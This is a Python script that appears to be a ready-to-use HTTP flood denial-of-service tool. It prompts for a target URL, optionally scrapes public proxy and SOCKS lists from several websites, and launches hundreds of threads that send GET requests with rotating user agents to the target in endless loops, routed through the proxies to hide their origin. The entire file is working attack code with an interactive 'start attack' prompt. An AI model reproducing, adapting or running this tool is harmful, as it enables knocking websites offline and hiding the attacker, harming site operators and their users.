import socket, threading, socks, random, re, urllib.request, os.path
from bs4 import BeautifulSoup

useragents=["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
			"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
			"Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
			"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
			"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
			"Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",]

def checkurl():
	global url
	global url2
	global urlport
	url = input("Insert URL: ")

	if url == "":
		print ("Please enter the url.")
		checkurl()

	if url[0]+url[1]+url[2]+url[3] == "www.":
		url = "http://" + url
	elif url[0]+url[1]+url[2]+url[3] == "http":
		pass
	else:
		url = "http://" + url

	try:
		url2 = url.replace("http://", "").replace("https://", "").split('/')[0].split(":")[0]
	except:
		url2 = url.replace("http://", "").replace("https://", "").split('/')[0]

	try:
		urlport = url.replace("http://", "").replace("https://", "").split('/')[0].split(':')[1]
	except:
		urlport = "80"
	proxymode()

def proxymode():
	global choise1
	choise1 = input("Do you want proxy mode? Answer 'y' to enable it: ")
	if choise1 == "y":
		choiseproxysocks()
	else:
		numthreads()

def choiseproxysocks():
	global choise2
	choise2 = input("Type '0' to enable proxymode or type '1' to enable socksmode: ")
	if choise2 == "0":
		choisedownproxy()
	elif choise2 == "1":
		choisedownsocks()
	else:
		print ("You mistyped, try again.")
		choiseproxysocks()

def choisedownproxy():
	choise3 = input("Do you want to download a fresh list of proxy? Answer 'y' to do it: ")
	if choise3 == "y":
		choisemirror1()
	else:
		proxylist()

def choisedownsocks():
	choise3 = input("Do you want to download a fresh list of proxy? Answer 'y' to do it: ")
	if choise3 == "y":
		choisemirror2()
	else:
		proxylist()

def choisemirror1():
	choise5 = input ("Download from: free-proxy-list.net='0' or inforge.net='1' ")
	if choise5 == "0":
		proxyget()
	elif choise5 == "1":
		procksget()
	else:
		print("You mistyped, try again.")
		choisemirror1()

def choisemirror2():
	choise5 = input ("Download from: socks-proxy.net='0' or inforge.net='1' ")
	if choise5 == "0":
		socksget()
	elif choise5 == "1":
		procksget()
	else:
		print("You mistyped, try again.")
		choisemirror2()

def proxyget():
	try:
		req = urllib.request.Request("http://free-proxy-list.net/")
		req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1")
		sourcecode = urllib.request.urlopen(req)
		part = str(sourcecode.read())
		part = part.split("<tbody>")
		part = part[1].split("</tbody>")
		part = part[0].split("<tr><td>")
		proxies = ""
		for proxy in part:
			proxy = proxy.split("</td><td>")
			try:
				proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
			except:
				pass
		out_file = open("proxy.txt","w")
		out_file.write(proxies)
		out_file.close()
		print ("Proxies downloaded successfully.")
	except:
		print ("An error occurred downloading proxies.")
	proxylist()

def socksget():
	try:
		req = urllib.request.Request("https://www.socks-proxy.net/")
		req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1")
		sourcecode = urllib.request.urlopen(req)
		part = str(sourcecode.read())
		part = part.split("<tbody>")
		part = part[1].split("</tbody>")
		part = part[0].split("<tr><td>")
		proxies = ""
		for proxy in part:
			proxy = proxy.split("</td><td>")
			try:
				proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
			except:
				pass
		out_file = open("proxy.txt","w")
		out_file.write(proxies)
		out_file.close()
		print ("Proxies downloaded successfully.")
	except:
		print ("An error occurred downloading proxies.")
	proxylist()

def procksget():
	try:
		if os.path.isfile("proxy.txt"):
			out_file = open("proxy.txt","w")
			out_file.write("")
			out_file.close()
		else:
			pass
		url = "https://www.inforge.net/xi/forums/liste-proxy.1118/"
		soup = BeautifulSoup(urllib.request.urlopen(url), "lxml")
		base = "https://www.inforge.net/xi/"
		for tag in soup.find_all("a", {"class":"PreviewTooltip"}):
			links = tag.get("href")
			final = base + links
			result = urllib.request.urlopen(final)
			for line in result :
				ip = re.findall("(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})", str(line))
				if ip:
					print("Grabbed=> "+'\n'.join(ip))
					for x in ip:
						out_file = open("proxy.txt","a")
						while True:
							out_file.write(x+"\n")
							out_file.close()
							break
	except:
		print ("An error occurred downloading proxies.")
	proxylist()

def proxylist():
	global entries
	out_file = str(input("Enter the proxy list (proxy.txt): "))
	if out_file == "":
		out_file = "proxy.txt"
	entries = open(out_file).readlines()
	numthreads()

def numthreads():
	global threads
	try:
		threads = int(input("Insert number of threads (800): "))
	except:
		threads = 800
	begin()

def begin():
	choise4 = input("Press 'Enter' to start attack: ")
	if choise4 == "":
		loop()
	elif choise4 == "Enter": #lool
		loop()
	else:
		exit(0)

def loop():
	global threads
	for x in range(threads):
		attack().start()

class attack(threading.Thread):

	def run(self):
		self.setuprequest()
		if choise1 == "y":
			if choise2 == "0":
				self.requestproxy()
			elif choise2 == "1":
				self.requestsocks()
			else:
				exit(0)
		else:
			self.requestdefault()

	def setuprequest(self):
		global request
		host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
		get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
		useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
		accept = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"
		connection = "Connection: Keep-Alive\r\n"
		request = get_host + useragent + accept + connection + "\r\n"

	def requestproxy(self):
		while True:
			try:
				proxy = random.choice(entries).strip().split(':')
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.setblocking(0)
				s.settimeout(0.3)
				s.connect((str(proxy[0]), int(proxy[1])))
				s.send(str.encode(request))
				print ("Request sent from " + str(proxy[0]+":"+proxy[1]))
			except:
				s.close()

	def requestsocks(self):
		while True:
			try:
				proxy = random.choice(entries).strip().split(':')
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
				s = socks.socksocket()
				s.setblocking(0)
				s.settimeout(6)
				s.connect((str(url2), int(urlport)))
				s.send (str.encode(request))
				print ("Request sent from " + str(proxy[0]+":"+proxy[1]))
			except:
				print ("Socks down. Retrying request.")
				s.close()

	def requestdefault(self):
		while True:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.setblocking(0)
				s.settimeout(0.3)
				s.connect((str(url2), int(urlport)))
				s.send (str.encode(request))
				print ("Request sent!")
			except:
				pass

checkurl()
